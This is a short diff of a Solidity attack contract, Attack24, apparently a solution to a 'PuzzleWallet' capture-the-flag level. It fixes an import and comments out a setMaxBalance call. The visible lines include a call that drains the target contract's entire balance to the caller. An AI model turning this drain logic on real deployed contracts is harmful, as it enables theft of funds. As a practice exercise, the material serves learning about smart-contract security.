@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./24-puzzletarget.sol";//       <-- WTF! 
+import "./24-puzzlewallet.sol"; //  
 
 contract Attack24 {
     PuzzleWallet public target;
@@ -43,7 +43,7 @@ contract Attack24 {
         );
 
         target.execute(msg.sender, address(target).balance, transfer_sig);
-        target.setMaxBalance(uint256(msg.sender));
+        // target.setMaxBalance(uint256(msg.sender));
 
      }
 
